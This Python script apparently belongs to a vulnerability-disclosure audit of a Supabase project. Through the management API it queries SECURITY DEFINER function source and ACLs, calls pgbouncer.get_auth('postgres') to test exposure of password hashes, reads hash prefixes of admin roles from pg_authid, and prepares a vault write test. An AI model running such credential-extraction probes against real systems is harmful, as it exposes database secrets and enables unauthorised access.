# -*- coding: utf-8 -*-
"""SECURITY DEFINER 函数源码/ACL 审计: pgbouncer.get_auth + vault.create_secret/update_secret"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ctx = ssl.create_default_context()
out = []
def q(sql, tag):
    body = json.dumps({"query": sql})
    c = http.client.HTTPSConnection(API_HOST, timeout=25, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json",
         "Authorization": "Bearer " + BEARER_JWT}
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request('POST', '/v1/projects/%s/database/query' % PROJECT_REF, headers=h, body=body)
        r = c.getresponse()
        b = r.read(16000).decode('utf-8', errors='replace')
        out.append('### [%s] (%.1fs)\n%s | %s' % (tag, time.time() - t0, r.status, b[:11000]))
        c.close()
    except Exception as e:
        out.append('### [%s] ERR %s' % (tag, e))

# 1. get_auth 源码 + ACL
q("select p.proname, p.proacl, p.prosrc from pg_proc p join pg_namespace n on n.oid=p.pronamespace where n.nspname='pgbouncer';", "get-auth-src")
# 2. vault 函数源码 (create_secret/update_secret/_crypto*)
q("select p.proname, p.proacl, left(p.prosrc, 3000) src from pg_proc p join pg_namespace n on n.oid=p.pronamespace where n.nspname='vault' and p.proname in ('create_secret','update_secret');", "vault-src")
# 3. 执行测试: get_auth 用任意用户名 (若 PUBLIC 可 execute -> 读 pg_shadow)
q("select pgbouncer.get_auth('postgres') as auth_pg;", "call-getauth")
# 4. pg_authid 密码列直读确认 (只取格式前缀)
q("select rolname, left(rolpassword, 15) pw_prefix from pg_authid where rolname in ('supabase_admin','postgres','supabase_auth_admin');", "authid-pw")
# 5. pgbouncer schema 全对象
q("select c.relname, c.relkind from pg_class c join pg_namespace n on n.oid=c.relnamespace where n.nspname='pgbouncer';", "pgbouncer-objs")
# 6. vault.create_secret 调用测试 (写入一条后删除 - 可逆; 先看签名)
q("select pg_get_function_arguments('vault.create_secret'::regproc) args;", "create-secret-args")

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb29_src.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('ttl=%ds' % (1788510807 - int(time.time())))
print('\n'.join(out)[:9000])
